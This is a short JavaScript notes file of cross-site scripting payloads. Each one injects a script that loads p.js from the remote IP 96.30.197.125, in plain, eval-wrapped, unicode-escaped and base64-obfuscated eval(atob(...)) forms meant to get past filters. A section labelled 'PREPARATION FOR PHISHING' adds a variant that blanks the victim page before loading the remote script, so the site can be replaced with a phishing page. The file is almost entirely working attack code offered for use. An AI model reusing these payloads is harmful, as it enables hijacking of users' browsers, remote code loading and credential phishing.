// not really working because of spaces and equal symbol.
let s = document.createElement('script');s.src='https://96.30.197.125/p.js';document.head.append(s);

// working but ugly
eval('s=document.createElement(\u0027script\u0027);s.src=\u0027https://96.30.197.125/p.js\u0027;document.head.append(s)')

// Base64 encoding with js
btoa("let s = document.createElement('script');s.src='https://96.30.197.125/p.js';document.head.append(s);")
// Output
"bGV0IHMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0naHR0cHM6Ly85Ni4zMC4xOTcuMTI1L3AuanMnO2RvY3VtZW50LmhlYWQuYXBwZW5kKHMpOw=="
// eval + atob
eval(atob('bGV0IHMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNyYz0naHR0cHM6Ly85Ni4zMC4xOTcuMTI1L3AuanMnO2RvY3VtZW50LmhlYWQuYXBwZW5kKHMpOw=='))


// PREPARATION FOR PHISHING
// with deletion of the original website to prepare phishing:
document.body.innerHTML='';let s=document.createElement('script');s.src='https://96.30.197.125/p.js';document.head.append(s);
// output:
"ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7bGV0IHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vOTYuMzAuMTk3LjEyNS9wLmpzJztkb2N1bWVudC5oZWFkLmFwcGVuZChzKTs"
// eval + atob
eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7bGV0IHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vOTYuMzAuMTk3LjEyNS9wLmpzJztkb2N1bWVudC5oZWFkLmFwcGVuZChzKTs'))
